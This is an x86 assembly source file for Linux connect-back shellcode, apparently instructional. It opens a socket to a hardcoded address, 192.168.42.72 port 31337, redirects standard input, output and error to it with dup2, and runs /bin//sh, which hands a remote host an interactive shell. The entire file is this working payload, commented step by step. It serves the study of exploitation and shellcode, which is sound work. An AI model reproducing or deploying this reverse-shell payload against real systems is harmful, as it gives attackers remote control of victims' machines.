BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66)
  pop eax
  cdq               ; zero out edx for use as a null DWORD later
  xor ebx, ebx      ; ebx is the type of socketcall
  inc ebx           ; 1 = SYS_SOCKET = socket() 
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; after syscall, eax has socket file descriptor
  
  xchg esi, eax     ; save socket FD in esi for later

; connect(s, [2, 31337, <IP address>], 16)
  push BYTE 0x66    ; socketcall (syscall #102) 
  pop eax
  inc ebx           ; ebx = 2 (needed for AF_INET)
  push DWORD 0x482aa8c0 ; Build sockaddr struct: IP Address = 192.168.42.72
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  inc ebx           ; ebx = 3 = SYS_CONNECT = connect()
  int 0x80          ; eax = 0 on successful connection

;  jz success        ; if connection successful, jump down to spawn shell
;  xor eax, eax      ; otherwise, exit cleanly
;  inc eax           ; eax = 1 exit (syscall #1)
;  xor ebx, ebx      ; status = 0  (nothing to see here)
;  int 0x80

;success:
; dup2(connected socket, {all three standard I/O file descriptors})
  xchg esi, ebx     ; put socket FD from esi into ebx (esi = 3)
  xchg ecx, esi     ; ecx = 3
  dec ecx           ; ecx starts at 2
;  xchg eax, esi     ; eax = 0x00000003  
;  push BYTE 0x2
;  pop ecx           ; ecx starts at 2
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  dec ecx           ; count down to 0 
  jns dup_loop      ; if the sign flag is not set, ecx is not negative

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push edx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
  mov ecx, esp      ; this is the argv array with string ptr
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
